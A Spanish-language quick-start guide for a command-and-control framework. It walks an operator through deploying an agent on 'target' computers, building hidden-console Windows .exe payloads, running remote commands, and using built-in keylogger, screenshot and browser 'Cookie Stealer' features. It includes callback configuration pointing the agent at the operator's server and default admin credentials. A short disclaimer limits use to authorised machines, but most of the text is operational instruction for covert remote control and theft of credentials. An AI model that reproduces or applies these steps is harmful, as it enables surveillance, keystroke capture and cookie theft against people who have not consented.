# 📘 GUÍA SIMPLE - C2 Framework

## ¿QUÉ ES ESTO?

Es un **panel de control web** para gestionar computadoras remotamente. Tiene 2 partes:

1. **Panel Web** (Dashboard) - Donde tú controlas todo desde el navegador
2. **Agente** (programa) - Se ejecuta en la computadora objetivo

---

## 🎯 ¿CÓMO FUNCIONA?

```
TU NAVEGADOR → Panel Web → Servidor → Agente en PC objetivo
     ↓
  Ves todo y controlas
```

**Ejemplo:**
1. Ejecutas el agente en una PC
2. Abres el panel en tu navegador
3. Ves la PC conectada
4. Le envías comandos
5. Recibes resultados

---

## 🚀 INSTALACIÓN SÚPER SIMPLE

### OPCIÓN 1: TODO YA ESTÁ INSTALADO (Sistema Actual)

El sistema **YA ESTÁ FUNCIONANDO** en este servidor. Solo necesitas:

```bash
# 1. Verificar que todo corre
sudo supervisorctl status

# Debe mostrar:
# backend      RUNNING
# frontend     RUNNING
# mongodb      RUNNING
```

**¡Ya está! Puedes usar el panel ahora mismo:**

```
http://localhost:3000
Usuario: admin
Contraseña: c2admin123
```

---

### OPCIÓN 2: INSTALAR VERSIÓN PHP (Alternativa)

Si quieres la versión PHP + MySQL en lugar de Python:

#### Paso 1: Instalar Base de Datos

```bash
# Entrar a MySQL
mysql -u root -p

# Copiar y pegar TODO el contenido del archivo /app/database.sql
# O importarlo directamente:
mysql -u root -p < /app/database.sql
```

#### Paso 2: Instalar Backend PHP

```bash
# Ejecutar script automático
sudo bash /app/install_php_c2.sh

# Esperar 2 minutos...
```

**¡Listo!** El sistema PHP estará en:
```
http://localhost/api/
```

---

## 📱 USAR EL PANEL WEB

### Paso 1: Abrir el Panel

En tu navegador:
```
http://localhost:3000
```

### Paso 2: Iniciar Sesión

```
Usuario: admin
Contraseña: c2admin123
```

### Paso 3: Entender el Panel

```
┌─────────────────────────────────────────┐
│  [☰] MENÚ LATERAL                       │
│  ├─ Dashboard  (inicio)                 │
│  ├─ Nodes      (computadoras conectadas)│
│  ├─ Advanced   (funciones especiales)   │
│  ├─ Builder    (crear .exe)             │
│  └─ Logs       (historial)              │
└─────────────────────────────────────────┘
```

---

## 💻 CONECTAR UNA COMPUTADORA

### En la Computadora Objetivo (que quieres controlar):

#### OPCIÓN A: Con Python (más fácil para probar)

```bash
# 1. Ir a donde está el agente
cd /app

# 2. Ejecutar el agente
python3 agent_advanced.py
```

**Verás algo como:**
```
============================================================
C2 Framework Advanced Agent - Starting...
============================================================
[SUCCESS] Registered with C2 - Node ID: abc123...
[SUCCESS] Connected to C2 server
```

#### OPCIÓN B: Con Ejecutable .exe (para Windows)

1. En el panel web, ir a **"Builder"**
2. Llenar los campos:
   - C2 Server: `ws://TU_IP:8001/api/ws`
   - AES Key: copiar de `/app/backend/.env`
   - ✓ Hide Console
3. Click **"Generate Payload"**
4. Esperar 2 minutos
5. Descargar de `/app/payloads/payload_xxx.exe`
6. Ejecutar en Windows

---

## 🎮 USAR EL PANEL

### 1️⃣ Ver Computadoras Conectadas

**Sidebar → Nodes**

Verás:
```
┌──────────────────────┐
│ ● TEST-PC-001       │  ← Punto verde = conectada
│ Windows 10          │
│ 192.168.1.100       │
└──────────────────────┘
```

### 2️⃣ Ejecutar Comandos

1. **Click en la computadora** (se pone borde morado)
2. En el cuadro de abajo, escribir comando:
   - Windows: `ipconfig`, `dir`, `whoami`
   - Linux: `ifconfig`, `ls`, `whoami`
3. **Click "Execute"**
4. Ver resultado en **"Command History"**

**Ejemplo:**
```
Comando: ipconfig
Resultado: 
Ethernet adapter:
  IPv4 Address: 192.168.1.100
  ...
```

### 3️⃣ Funciones Avanzadas

**Sidebar → Advanced**

Debes tener un nodo seleccionado primero. Luego:

**📸 Screenshot** - Captura la pantalla
```
Click en "Screenshot Capture" → "Activate"
Resultado aparece en Logs
```

**📁 File Browser** - Ver archivos
```
Click en "File Browser" → "Activate"
Lista de archivos aparece en Logs
```

**⌨️ Keylogger** - Capturar teclado
```
Click "Start" → Esperar → Click "Get Data"
Teclas capturadas aparecen en Logs
```

**🍪 Cookie Stealer** - Robar cookies navegador
```
Click "Steal Cookies" → Confirmar
Cookies aparecen en Logs
```

### 4️⃣ Ver Historial

**Sidebar → Logs**

Todo lo que haces queda registrado:
```
[12:30] node_register - Node registered: TEST-PC
[12:31] command_execute - Command: ipconfig
[12:32] screenshot_requested - Screenshot capture
```

---

## 📊 ENTENDER EL DASHBOARD

### Vista Principal (Dashboard Tab)

```
┌─────────────┬─────────────┬─────────────┬─────────────┐
│ Total Nodes │   Online    │   Offline   │  Commands   │
│      5      │      3      │      2      │     127     │
└─────────────┴─────────────┴─────────────┴─────────────┘

Recent Activity                 Active Nodes
├─ login (admin)               ├─ ● PC-001 (192.168.1.100)
├─ command_execute             ├─ ● SERVER-02 (10.0.0.5)
└─ screenshot_requested        └─ ● LAPTOP-03 (172.16.0.10)
```

**Colores:**
- 🟢 Verde = Online / Éxito
- 🔴 Rojo = Offline / Error
- 🟡 Amarillo = Pendiente / Advertencia

---

## 🔑 CREDENCIALES Y CONFIGURACIÓN

### Panel Web
```
URL: http://localhost:3000
Usuario: admin
Contraseña: c2admin123
```

### Cambiar Contraseña

**Python Backend:**
```bash
# Editar archivo
nano /app/backend/.env

# Cambiar línea:
ADMIN_PASS="tu_nueva_contraseña"

# Reiniciar
sudo supervisorctl restart backend
```

**PHP Backend:**
```sql
# Conectar a MySQL
mysql -u root -p c2_framework

# Cambiar password
UPDATE users SET password = '$2y$10$nuevo_hash' WHERE username = 'admin';
```

---

## 🌐 USAR DESDE OTRA COMPUTADORA

### Si el servidor tiene IP: 192.168.1.50

#### 1. Actualizar Configuración Frontend

```bash
# Editar archivo
nano /app/frontend/.env

# Cambiar:
REACT_APP_BACKEND_URL=http://192.168.1.50:8001
```

#### 2. Actualizar Agente

```bash
# Editar archivo
nano /app/agent_advanced.py

# Cambiar líneas 19-20:
C2_SERVER = "ws://192.168.1.50:8001/api/ws"
API_SERVER = "http://192.168.1.50:8001/api"
```

#### 3. Reiniciar

```bash
sudo supervisorctl restart all
```

#### 4. Acceder desde Otra PC

En tu navegador:
```
http://192.168.1.50:3000
```

---

## ❓ PREGUNTAS FRECUENTES

### ¿Cómo sé si está funcionando?

```bash
# Ver estado de servicios
sudo supervisorctl status

# Debe mostrar todo RUNNING
```

### ¿Cómo reinicio todo?

```bash
sudo supervisorctl restart all
```

### ¿Dónde ver errores?

```bash
# Backend
tail -f /var/log/supervisor/backend.err.log

# Frontend
tail -f /var/log/supervisor/frontend.err.log
```

### ¿El agente no conecta?

**Verificar:**
1. ¿Backend está corriendo? `sudo supervisorctl status backend`
2. ¿La IP es correcta en agent_advanced.py?
3. ¿El AES_KEY coincide?

```bash
# Ver AES_KEY del servidor
grep AES_KEY /app/backend/.env

# Ver AES_KEY del agente
grep AES_KEY /app/agent_advanced.py

# Deben ser IGUALES
```

### ¿Cómo probar con otra computadora en mi red local?

**En el servidor (donde instalaste):**
```bash
# 1. Ver tu IP
ip addr show

# Ejemplo: 192.168.1.100

# 2. Editar agente
nano /app/agent_advanced.py

# Cambiar:
C2_SERVER = "ws://192.168.1.100:8001/api/ws"
API_SERVER = "http://192.168.1.100:8001/api"

# 3. Copiar agente a otra PC
scp /app/agent_advanced.py usuario@otra-pc:~/

# 4. En la otra PC, ejecutar:
python3 agent_advanced.py
```

---

## 🎯 EJEMPLO COMPLETO PASO A PASO

### Escenario: Controlar tu laptop desde tu PC

**PC Principal** (donde instalaste): `192.168.1.100`
**Laptop** (que quieres controlar): `192.168.1.101`

#### En la PC Principal:

```bash
# 1. Verificar sistema corriendo
sudo supervisorctl status

# 2. Editar agente con tu IP
nano /app/agent_advanced.py
# Cambiar líneas 19-20 con tu IP: 192.168.1.100

# 3. Copiar agente a laptop
scp /app/agent_advanced.py usuario@192.168.1.101:~/
```

#### En la Laptop:

```bash
# 1. Instalar dependencias
pip install websockets pycryptodome psutil requests pillow pynput

# 2. Ejecutar agente
python3 agent_advanced.py
```

#### De vuelta en PC Principal:

```
1. Abrir navegador: http://192.168.1.100:3000
2. Login: admin / c2admin123
3. Ir a "Nodes" - Verás tu laptop conectada
4. Click en la laptop
5. Escribir comando: whoami
6. Click "Execute"
7. ¡Ver resultado!
```

---

## 📱 USAR DESDE TU TELÉFONO

Si quieres acceder desde tu celular en la misma red WiFi:

```
http://192.168.1.100:3000
```

(Cambiar 192.168.1.100 por la IP de tu servidor)

---

## 🔒 IMPORTANTE - SEGURIDAD

### ⚠️ SOLO USAR EN:
✅ Tus propias computadoras
✅ Red local de tu casa/empresa
✅ Con permiso explícito por escrito

### ❌ NUNCA USAR EN:
❌ Computadoras de otras personas sin permiso
❌ Redes públicas
❌ Internet abierto sin VPN

---

## 🆘 AYUDA RÁPIDA

### Comando No Funciona
```bash
# Ver si el nodo está online
# Dashboard → debe tener punto verde

# Ver logs del agente
# En la PC objetivo, revisar salida del agente
```

### Panel No Carga
```bash
# Reiniciar frontend
sudo supervisorctl restart frontend

# Ver logs
tail -f /var/log/supervisor/frontend.err.log
```

### No Veo Nodos Conectados
```bash
# 1. Verificar agente está corriendo en PC objetivo
# 2. Ver logs del agente
# 3. Verificar IP y puerto correctos
```

---

## 📞 COMANDOS ÚTILES DE UN VISTAZO

```bash
# Ver estado
sudo supervisorctl status

# Reiniciar todo
sudo supervisorctl restart all

# Ver logs backend
tail -f /var/log/supervisor/backend.out.log

# Ver logs frontend  
tail -f /var/log/supervisor/frontend.out.log

# Ver tu IP
ip addr show | grep "inet "

# Probar API
curl http://localhost:8001/api/

# Ejecutar agente
python3 /app/agent_advanced.py

# Ver agentes compilados
ls -lh /app/payloads/
```

---

## 🎉 RESUMEN ULTRA RÁPIDO

**Sistema Ya Instalado (Python/MongoDB):**
```bash
1. Abrir: http://localhost:3000
2. Login: admin / c2admin123
3. Ejecutar agente: python3 /app/agent_advanced.py
4. Ir a "Nodes" y seleccionar
5. Ejecutar comandos
```

**Instalar Versión PHP/MySQL:**
```bash
1. mysql -u root -p < /app/database.sql
2. sudo bash /app/install_php_c2.sh
3. Abrir: http://localhost:3000
4. Login: admin / c2admin123
```

**Desde Red Local:**
```bash
1. Ver tu IP: ip addr
2. Editar agente con tu IP
3. Copiar agente a otra PC
4. Ejecutar agente
5. Acceder panel: http://TU_IP:3000
```

---

## 🎓 PRÓXIMOS PASOS

1. ✅ **Probar en local** - Ejecutar agente en tu misma PC
2. ✅ **Probar en red** - Ejecutar agente en otra PC en tu red
3. ✅ **Explorar funciones** - Probar screenshot, keylogger, etc.
4. ✅ **Generar .exe** - Usar el Builder para crear ejecutable
5. ✅ **Leer docs avanzadas** - Ver `/app/ADVANCED_FEATURES.md`

---

## 📚 MÁS INFORMACIÓN

**Documentación Completa:**
- `/app/README.md` - Overview general
- `/app/TUTORIAL_REDTEAM.md` - Tutorial completo
- `/app/ADVANCED_FEATURES.md` - Funciones avanzadas
- `/app/INSTALL_PHP.md` - Instalación PHP/MySQL

**Ver archivos:**
```bash
cat /app/README.md
less /app/TUTORIAL_REDTEAM.md
```

---

🛡️ **¡Ya Sabes Usar el C2 Framework!**

**Cualquier duda, ejecuta:**
```bash
bash /app/test_c2.sh
```

Esto prueba que todo funciona correctamente.
